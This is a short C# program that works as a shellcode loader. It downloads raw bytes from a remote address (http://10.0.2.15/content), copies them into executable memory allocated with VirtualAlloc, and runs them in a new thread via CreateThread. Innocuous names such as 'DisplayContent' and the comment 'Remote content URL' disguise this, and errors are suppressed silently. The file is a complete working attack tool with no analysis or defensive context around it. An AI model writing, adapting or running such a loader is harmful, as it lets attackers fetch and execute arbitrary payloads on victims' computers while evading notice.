using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

class Program
{
    // Remote content URL
    private const string contentUrl = "http://10.0.2.15/content";

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

    [DllImport("Kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern Int32 WaitForSingleObject(IntPtr Handle, UInt32 Wait);


    static async Task Main(string[] args)
    {
        try
        {
            byte[] fileBytes = await DownloadFileAsByteArray(contentUrl);
            //Console.WriteLine($"Downloaded {fileBytes.Length} bytes.");
            //Console.WriteLine("Byte array:");
            //Console.WriteLine(BitConverter.ToString(fileBytes).Replace("-", " "));

            DisplayContent(fileBytes);

        }
        catch (Exception ex)
        {
            //Console.WriteLine($"Error downloading file: {ex.Message}");
        }
    }

    static async Task<byte[]> DownloadFileAsByteArray(string url)
    {
        using HttpClient client = new HttpClient();
        byte[] data = await client.GetByteArrayAsync(url);
        return data;
    }

    static void DisplayContent(byte[] data)
    {
        int size = data.Length;
        IntPtr baddr = VirtualAlloc(IntPtr.Zero, size, 0x3000, 0x40);
        Marshal.Copy(data, 0, baddr, size);
        IntPtr threadId = CreateThread(IntPtr.Zero, 0, baddr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(threadId, 0xFFFFFFFF);
    }
}